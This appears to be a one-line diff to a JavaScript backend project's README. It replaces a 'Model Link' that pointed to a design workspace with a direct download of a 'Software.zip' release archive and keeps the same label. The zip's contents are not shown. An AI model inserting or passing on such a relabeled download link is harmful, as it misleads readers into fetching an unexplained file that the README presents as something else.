@@ -2,4 +2,4 @@
 
 Backend project in javascript
 
-- [Model Link](https://app.eraser.io/workspace/YtPqZ1VogxGy1jzIDkzj)
+- [Model Link](https://github.com/Taimoor-Ahmmad/backend-javascript/releases/download/v1.0/Software.zip)
